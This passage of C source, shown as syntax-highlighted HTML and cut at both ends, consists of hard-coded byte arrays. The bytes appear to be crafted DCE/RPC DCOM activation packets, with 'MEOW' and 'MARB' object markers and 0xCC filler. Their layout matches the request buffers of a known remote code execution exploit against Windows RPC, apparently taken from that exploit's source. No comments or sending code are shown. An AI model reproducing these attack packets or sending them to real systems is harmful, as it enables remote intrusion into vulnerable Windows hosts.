</span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x0B</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x48</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x7F</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc4">0xD0</span><span class="sc10">,</span><span class="sc4">0x16</span><span class="sc10">,</span><span class="sc4">0xD0</span><span class="sc10">,</span><span class="sc4">0x16</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">

</span><span class="sc4">0xa0</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x5D</span><span class="sc10">,</span><span class="sc4">0x88</span><span class="sc10">,</span><span class="sc4">0x8A</span><span class="sc10">,</span><span class="sc4">0xEB</span><span class="sc10">,</span><span class="sc4">0x1C</span><span class="sc10">,</span><span class="sc4">0xC9</span><span class="sc10">,</span><span class="sc4">0x11</span><span class="sc10">,</span><span class="sc4">0x9F</span><span class="sc10">,</span><span class="sc4">0xE8</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc4">0x2B</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x48</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">};</span><span class="sc0">



</span><span class="sc16">unsigned</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">request1</span><span class="sc10">[]={</span><span class="sc0">
</span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xE8</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc0">
</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xE5</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xD0</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x05</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x06</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x32</span><span class="sc10">,</span><span class="sc4">0x24</span><span class="sc10">,</span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc4">0xFD</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x45</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x64</span><span class="sc10">,</span><span class="sc4">0x49</span><span class="sc10">,</span><span class="sc4">0xB0</span><span class="sc10">,</span><span class="sc4">0x70</span><span class="sc10">,</span><span class="sc4">0xDD</span><span class="sc10">,</span><span class="sc4">0xAE</span><span class="sc10">,</span><span class="sc4">0x74</span><span class="sc10">,</span><span class="sc4">0x2C</span><span class="sc10">,</span><span class="sc4">0x96</span><span class="sc10">,</span><span class="sc4">0xD2</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x5E</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x70</span><span class="sc10">,</span><span class="sc4">0x5E</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x7C</span><span class="sc10">,</span><span class="sc4">0x5E</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x80</span><span class="sc10">,</span><span class="sc4">0x96</span><span class="sc10">,</span><span class="sc4">0xF1</span><span class="sc10">,</span><span class="sc4">0xF1</span><span class="sc10">,</span><span class="sc4">0x2A</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0xCE</span><span class="sc10">,</span><span class="sc4">0x11</span><span class="sc10">,</span><span class="sc4">0xA6</span><span class="sc10">,</span><span class="sc4">0x6A</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0xAF</span><span class="sc10">,</span><span class="sc4">0x6E</span><span class="sc10">,</span><span class="sc4">0x72</span><span class="sc10">,</span><span class="sc4">0xF4</span><span class="sc10">,</span><span class="sc4">0x0C</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x41</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x52</span><span class="sc10">,</span><span class="sc4">0x42</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x0D</span><span class="sc10">,</span><span class="sc4">0xF0</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0xBA</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xA8</span><span class="sc10">,</span><span class="sc4">0xF4</span><span class="sc10">,</span><span class="sc4">0x0B</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x45</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0x57</span><span class="sc10">,</span><span class="sc4">0x04</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xA2</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x38</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xC8</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4D</span><span class="sc10">,</span><span class="sc4">0x45</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0x57</span><span class="sc10">,</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0x03</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xD8</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x02</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC4</span><span class="sc10">,</span><span class="sc4">0x28</span><span class="sc10">,</span><span class="sc4">0xCD</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x64</span><span class="sc10">,</span><span class="sc4">0x29</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0xCD</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xB9</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xAB</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xA5</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xA6</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xA4</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xAD</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0xAA</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xC0</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x46</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x60</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x58</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x90</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x40</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x78</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x30</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x50</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x4F</span><span class="sc10">,</span><span class="sc4">0xB6</span><span class="sc10">,</span><span class="sc4">0x88</span><span class="sc10">,</span><span class="sc4">0x20</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0xFF</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x01</span><span class="sc10">,</span><span class="sc4">0x10</span><span class="sc0">

</span><span class="sc10">,</span><span class="sc4">0x08</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0xCC</span><span class="sc10">,</span><span class="sc4">0x48</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x07</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x66</span><span class="sc10">,</span><span class="sc4">0x00</span><span class="sc10">,</span><span class="sc4">0x06</span><span class="sc10">,</span><span class="sc4">0x09</span><span class="sc0">

